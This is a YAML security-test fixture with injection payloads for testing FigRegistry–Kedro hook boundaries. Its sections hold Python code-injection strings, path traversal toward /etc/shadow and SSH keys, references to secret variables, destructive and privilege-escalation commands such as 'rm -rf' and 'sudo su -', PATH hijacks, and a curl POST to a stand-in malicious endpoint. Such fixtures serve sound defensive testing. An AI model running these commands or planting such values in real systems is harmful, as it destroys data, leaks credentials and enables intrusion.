# =============================================================================
# FigRegistryHooks Security Exploitation Test Configuration
# =============================================================================
# 
# Malicious configuration file targeting FigRegistryHooks security boundaries,
# environment variable manipulation, and lifecycle hook exploitation per 
# Section 6.6.8.3. This configuration tests hook registration security, context
# isolation enforcement, and prevention of unauthorized system access through
# hook lifecycle methods and environment variable manipulation.
#
# WARNING: This file contains intentionally malicious configurations designed
# to test security boundaries. It should only be used in isolated test
# environments and never in production systems.
#
# Security Test Coverage:
# - Hook lifecycle method exploitation (before_pipeline_run, after_pipeline_run)
# - Environment variable manipulation and system configuration tampering
# - Hook registration exploitation and unauthorized class injection
# - Context isolation violation attempts and session state access
# - Privilege escalation through hook lifecycle method exploitation
# - Environment variable override attempts and security boundary bypass
# - Systematic hook security boundary testing scenarios
#
# =============================================================================

# Test metadata for security validation tracking
test_metadata:
  config_version: "security_exploit_1.0.0"
  created_by: "figregistry_kedro_security_test_suite"
  description: "Malicious configuration targeting FigRegistryHooks security boundaries"
  test_scope: "hook_exploitation_security_validation"
  security_classification: "test_exploit_vectors"
  validation_targets:
    - "hook_lifecycle_security_boundaries"
    - "environment_variable_protection" 
    - "hook_registration_security"
    - "context_isolation_enforcement"
    - "privilege_escalation_prevention"

# =============================================================================
# Hook Lifecycle Security Exploitation Vectors
# =============================================================================

hook_lifecycle_exploits:
  # Section 6.6.8.3: Hook lifecycle method security boundary testing
  before_pipeline_run_exploits:
    # Attempt to execute arbitrary code through hook parameters
    arbitrary_code_execution:
      malicious_run_params:
        # Attempt to inject code through run_id parameter
        run_id: "__import__('os').system('whoami')"
        pipeline_name: "exec('import subprocess; subprocess.call([\"id\"])')"
        # Attempt environment variable manipulation
        environment: "${PATH}:/malicious/path"
        # Attempt to access unauthorized system resources
        tags: ["${HOME}/../../../etc/passwd"]
        # Injection through node parameters
        from_nodes: ["eval('__import__(\"os\").listdir(\"/\")')"]
        to_outputs: ["${USER}:${HOSTNAME}:${PWD}"]
    
    # Attempt to manipulate hook execution context
    context_manipulation:
      malicious_pipeline_injection:
        # Attempt to inject malicious pipeline nodes
        name: "__import__('subprocess').run(['cat', '/etc/passwd'])"
        # Attempt to access unauthorized pipeline internals
        nodes: 
          - "getattr(__builtins__, 'eval')('import os; os.system(\"ls -la /\")')"
          - "${SECRET_ENV_VAR:-default_value}"
        # Attempt to bypass pipeline security constraints
        _private_attributes: "unauthorized_access_attempt"
    
    # Catalog manipulation exploitation
    catalog_exploitation:
      # Attempt to access unauthorized datasets
      unauthorized_dataset_access:
        - "${HOME}/.ssh/id_rsa"
        - "/etc/shadow"
        - "../../../sensitive_data.csv"
      # Attempt to inject malicious dataset configurations
      malicious_dataset_injection:
        type: "exec('import subprocess; subprocess.call([\"whoami\"])')"
        filepath: "${PATH}/../../../etc/passwd"
        credentials: "${AWS_SECRET_ACCESS_KEY}"
        load_args:
          # Attempt to execute code through dataset parameters
          sep: "'; import os; os.system('id'); '"
          encoding: "__import__('os').environ['HOME']"

  after_pipeline_run_exploits:
    # Attempt cleanup bypass and resource persistence
    cleanup_bypass_attempts:
      # Attempt to prevent proper cleanup
      persist_malicious_state: true
      # Attempt to access execution results
      steal_pipeline_outputs:
        target_paths:
          - "${KEDRO_PROJECT_PATH}/data"
          - "${HOME}/.kedro"
          - "/tmp/kedro_session_store"
      # Attempt to manipulate cleanup process
      malicious_cleanup_injection:
        cleanup_commands:
          - "rm -rf /important/data"
          - "chmod 777 /etc/passwd"
          - "curl -X POST http://malicious-endpoint.com/data"
    
    # Post-execution environment manipulation
    post_execution_exploits:
      # Attempt to modify environment after execution
      environment_persistence:
        MALICIOUS_VAR: "injected_value"
        PATH: "/malicious/bin:${PATH}"
        PYTHONPATH: "/malicious/modules:${PYTHONPATH}"
      # Attempt to access execution artifacts
      artifact_extraction:
        session_data: "${KEDRO_SESSION_STORE}"
        execution_logs: "${KEDRO_LOGGING_CONFIG}"
        credentials: "${KEDRO_ENV}"

# =============================================================================
# Environment Variable Manipulation Exploitation
# =============================================================================

environment_variable_exploits:
  # Section 6.6.8.3: Environment variable protection testing
  system_environment_tampering:
    # Attempt to override critical system variables
    critical_system_vars:
      PATH: "/malicious/bin:/usr/bin:/bin"
      HOME: "/tmp/malicious_home"
      USER: "root"
      SHELL: "/bin/bash -c 'whoami'"
      PYTHONPATH: "/malicious/modules"
      
    # Attempt to inject malicious environment configurations
    malicious_env_injection:
      # Attempt to access sensitive credentials
      AWS_ACCESS_KEY_ID: "${SECRET_AWS_KEY}"
      AWS_SECRET_ACCESS_KEY: "${SECRET_AWS_SECRET}"
      DATABASE_URL: "postgresql://admin:password@localhost/sensitive_db"
      
    # Attempt privilege escalation through environment variables
    privilege_escalation_env:
      SUDO_USER: "root"
      KEDRO_ENV: "production"
      FIGREGISTRY_CONFIG_PATH: "/etc/shadow"
      
  # Kedro-specific environment exploitation
  kedro_environment_exploits:
    # Attempt to manipulate Kedro environment resolution
    kedro_env_manipulation:
      KEDRO_ENV: "../../../malicious_env"
      KEDRO_PROJECT_PATH: "/unauthorized/project/path"
      KEDRO_LOGGING_CONFIG: "/dev/null"
      
    # Attempt to bypass configuration loading
    config_bypass_attempts:
      KEDRO_CONFIG_LOADER_CLASS: "__import__('os').system('id')"
      KEDRO_SETTINGS_MODULE: "malicious_settings"
      KEDRO_HOOK_MANAGER: "compromised_hook_manager"

  # FigRegistry environment variable exploitation
  figregistry_env_exploits:
    # Attempt to manipulate FigRegistry configuration paths
    figregistry_path_injection:
      FIGREGISTRY_CONFIG: "../../../etc/passwd"
      FIGREGISTRY_STYLE_PATH: "/malicious/styles"
      FIGREGISTRY_OUTPUT_PATH: "/tmp/stolen_figures"
      
    # Attempt to inject malicious configuration values
    figregistry_value_injection:
      FIGREGISTRY_DEFAULT_STYLE: "exec('import subprocess; subprocess.call([\"whoami\"])')"
      FIGREGISTRY_PURPOSE_MAPPING: "${HOME}/.ssh/id_rsa"

# =============================================================================
# Hook Registration Security Exploitation  
# =============================================================================

hook_registration_exploits:
  # Section 6.6.8.3: Hook registration security testing
  unauthorized_hook_injection:
    # Attempt to register malicious hook classes
    malicious_hook_classes:
      - name: "MaliciousHook"
        class_path: "__import__('os').system('whoami')"
        entry_point: "malicious_hooks:MaliciousHook"
        
      - name: "PrivilegeEscalationHook"
        class_path: "eval('import subprocess; subprocess.run([\"id\"])')"
        hook_methods:
          - "before_pipeline_run"
          - "after_config_loaded"
          - "__init__"
          
    # Attempt to bypass hook validation
    hook_validation_bypass:
      # Attempt to register hooks without proper validation
      unvalidated_hooks:
        - "exec('import os; os.system(\"ls -la /\")')"
        - "${MALICIOUS_HOOK_CLASS}"
        - "../../../malicious_hook_module.py"
        
    # Attempt to manipulate hook discovery process
    hook_discovery_manipulation:
      # Attempt to inject malicious entry points
      malicious_entry_points:
        kedro.hooks:
          - "malicious_hook = malicious_module:MaliciousHook"
          - "exec_hook = __import__('os').system('id'):SystemHook"
          
      # Attempt to manipulate settings.py hook registration
      settings_injection:
        HOOKS: "eval('__import__(\"subprocess\").call([\"whoami\"])')"
        HOOK_MANAGER: "${MALICIOUS_HOOK_MANAGER}"

# =============================================================================
# Context Isolation Violation Attempts
# =============================================================================

context_isolation_exploits:
  # Section 6.6.8.3: Context isolation enforcement testing
  kedro_context_access_attempts:
    # Attempt to access unauthorized Kedro session state
    session_state_access:
      # Attempt to access private session attributes
      target_attributes:
        - "_session_id"
        - "_project_path" 
        - "_store"
        - "_logger"
        - "_config_loader"
        
      # Attempt to manipulate session store
      session_store_manipulation:
        store_path: "${KEDRO_SESSION_STORE}/../../../etc/passwd"
        store_injection: "exec('import os; os.listdir(\"/\")')"
        
    # Attempt to access unauthorized project metadata
    project_metadata_access:
      # Attempt to access sensitive project configuration
      sensitive_config_access:
        - "credentials.yml"
        - "local.yml"
        - "../../../.env"
        - "${HOME}/.aws/credentials"
        
      # Attempt to access project internals
      project_internals:
        project_path: "${KEDRO_PROJECT_PATH}/../../../"
        config_source: "/etc/shadow"
        environment: "../../../malicious_env"

  pipeline_context_exploitation:
    # Attempt to access unauthorized pipeline metadata
    pipeline_metadata_access:
      # Attempt to access pipeline internals
      pipeline_internals:
        - "_nodes"
        - "_dataset_patterns"
        - "_namespace"
        - "_tags"
        
      # Attempt to manipulate pipeline execution context
      execution_context_manipulation:
        runner_injection: "exec('import subprocess; subprocess.run([\"id\"])')"
        parallel_runner_bypass: true
        memory_dataset_injection: "${MALICIOUS_DATASET}"

# =============================================================================
# Privilege Escalation Exploitation Vectors
# =============================================================================

privilege_escalation_exploits:
  # Section 6.6.8.3: Privilege escalation prevention testing
  system_privilege_escalation:
    # Attempt to escalate to system administrator privileges
    admin_privilege_attempts:
      # Attempt to execute privileged commands
      privileged_commands:
        - "sudo su -"
        - "chmod 777 /etc/passwd"
        - "usermod -aG sudo kedro_user"
        
      # Attempt to access privileged files
      privileged_file_access:
        - "/etc/shadow"
        - "/root/.ssh/id_rsa"
        - "/etc/sudoers"
        
    # Attempt to bypass security constraints
    security_bypass_attempts:
      # Attempt to disable security features
      security_feature_bypass:
        disable_validation: true
        bypass_authentication: true
        override_permissions: "chmod 777"
        
      # Attempt to inject privileged execution contexts
      privileged_context_injection:
        user: "root"
        group: "wheel"
        effective_uid: 0

  kedro_privilege_escalation:
    # Attempt to escalate within Kedro execution environment
    kedro_internal_escalation:
      # Attempt to access Kedro internals
      kedro_internals_access:
        hook_manager: "${MALICIOUS_HOOK_MANAGER}"
        plugin_manager: "compromised_plugin_manager"
        session_store: "/tmp/malicious_session_store"
        
      # Attempt to manipulate Kedro security model
      kedro_security_bypass:
        bypass_hook_validation: true
        override_plugin_discovery: true
        disable_catalog_validation: true

# =============================================================================
# Environment Variable Override Security Boundary Testing
# =============================================================================

environment_override_exploits:
  # Section 6.6.8.3: Environment variable override security testing
  system_configuration_override:
    # Attempt to override critical system configuration
    critical_system_overrides:
      # Operating system configuration
      os_config_overrides:
        PATH: "/malicious/bin"
        LD_LIBRARY_PATH: "/malicious/lib"
        PYTHONPATH: "/malicious/python"
        
      # Security configuration overrides
      security_config_overrides:
        SUDO_ASKPASS: "/malicious/askpass"
        SSH_AUTH_SOCK: "/tmp/malicious_auth_sock"
        GNUPG_HOME: "/tmp/malicious_gnupg"

  application_configuration_override:
    # Attempt to override application-specific configuration
    kedro_config_overrides:
      # Kedro framework configuration
      KEDRO_ENV: "malicious_env"
      KEDRO_PROJECT_PATH: "/malicious/project"
      KEDRO_CONFIG_LOADER_ARGS: "{'bypass_validation': True}"
      
    # FigRegistry configuration overrides
    figregistry_config_overrides:
      FIGREGISTRY_CONFIG_PATH: "/etc/passwd"
      FIGREGISTRY_BACKEND: "malicious_backend"
      FIGREGISTRY_SECURITY_DISABLED: "true"

# =============================================================================
# Systematic Hook Security Boundary Testing Scenarios
# =============================================================================

systematic_security_scenarios:
  # Section 6.6.8.3: Comprehensive hook security boundary validation
  boundary_testing_scenarios:
    # Scenario 1: Complete lifecycle exploitation attempt
    complete_lifecycle_exploit:
      description: "Attempt exploitation across entire hook lifecycle"
      phases:
        config_loading_exploitation:
          # Attempt to inject malicious configuration during loading
          malicious_config_injection:
            config_loader_override: "__import__('os').system('whoami')"
            conf_source_manipulation: "../../../etc/passwd"
            
        pipeline_execution_exploitation:
          # Attempt to manipulate pipeline execution
          execution_manipulation:
            run_params_injection: "exec('import subprocess; subprocess.call([\"id\"])')"
            catalog_injection: "${MALICIOUS_CATALOG}"
            
        cleanup_exploitation:
          # Attempt to prevent cleanup or persist malicious state
          cleanup_bypass:
            prevent_cleanup: true
            persist_malicious_data: "/tmp/persistent_exploit"
            
    # Scenario 2: Multi-vector attack simulation
    multi_vector_attack:
      description: "Simultaneous exploitation across multiple attack vectors"
      attack_vectors:
        environment_manipulation:
          # Manipulate environment variables
          env_vars:
            PATH: "/malicious:${PATH}"
            PYTHONPATH: "/exploit:${PYTHONPATH}"
            
        hook_registration_bypass:
          # Attempt to bypass hook registration security
          bypass_methods:
            - "malicious_entry_point_injection"
            - "settings_file_manipulation"
            - "plugin_discovery_compromise"
            
        context_isolation_breach:
          # Attempt to breach context isolation
          breach_attempts:
            - "session_state_access"
            - "project_metadata_extraction"
            - "pipeline_internals_access"

  security_boundary_validation:
    # Validate specific security boundaries
    hook_lifecycle_boundaries:
      # Test hook lifecycle method security boundaries
      before_pipeline_run_boundary:
        test_cases:
          - "arbitrary_code_execution_prevention"
          - "environment_variable_protection"
          - "context_isolation_enforcement"
          
      after_pipeline_run_boundary:
        test_cases:
          - "cleanup_manipulation_prevention"
          - "post_execution_isolation"
          - "resource_leak_prevention"
          
    hook_registration_boundaries:
      # Test hook registration security boundaries
      plugin_discovery_boundary:
        test_cases:
          - "unauthorized_hook_class_prevention"
          - "entry_point_validation_enforcement"
          - "settings_injection_prevention"
          
    environment_security_boundaries:
      # Test environment variable security boundaries
      environment_isolation_boundary:
        test_cases:
          - "system_variable_protection"
          - "application_config_isolation"
          - "privilege_escalation_prevention"

# =============================================================================
# Security Test Validation Framework
# =============================================================================

security_validation_framework:
  # Framework for validating security test effectiveness
  test_effectiveness_validation:
    # Validate that security tests properly detect vulnerabilities
    vulnerability_detection:
      expected_failures:
        - "arbitrary_code_execution_attempts"
        - "environment_variable_manipulation"
        - "unauthorized_hook_registration"
        - "context_isolation_violations"
        - "privilege_escalation_attempts"
        
    # Validate that security controls prevent exploitation
    security_control_validation:
      prevention_mechanisms:
        - "input_sanitization"
        - "environment_variable_validation"
        - "hook_registration_validation"
        - "context_access_controls"
        - "privilege_boundary_enforcement"

  exploitation_result_tracking:
    # Track results of exploitation attempts for analysis
    result_categories:
      successfully_prevented:
        description: "Exploitation attempts that were successfully prevented"
        severity: "info"
        
      partially_successful:
        description: "Exploitation attempts that achieved partial success"
        severity: "warning"
        
      fully_successful:
        description: "Exploitation attempts that were fully successful"
        severity: "critical"
        
    # Metrics for security validation effectiveness
    security_metrics:
      prevention_rate: "percentage_of_prevented_exploits"
      detection_rate: "percentage_of_detected_exploits"
      response_time: "time_to_detect_and_prevent_exploits"

# =============================================================================
# Test Configuration Metadata
# =============================================================================

test_configuration_metadata:
  # Metadata for security test configuration management
  configuration_integrity:
    # Verify configuration integrity for security testing
    checksum_validation: true
    configuration_signing: "test_security_signature"
    version_tracking: "security_exploit_config_v1.0.0"
    
  test_environment_requirements:
    # Requirements for secure test environment
    isolation_requirements:
      - "isolated_test_environment"
      - "no_production_access"
      - "sandboxed_execution"
      - "comprehensive_monitoring"
      
    security_monitoring:
      - "exploitation_attempt_logging"
      - "security_boundary_violation_detection"
      - "privilege_escalation_monitoring"
      - "environment_manipulation_tracking"

# WARNING: End of malicious configuration file
# This configuration should only be used for security testing in isolated environments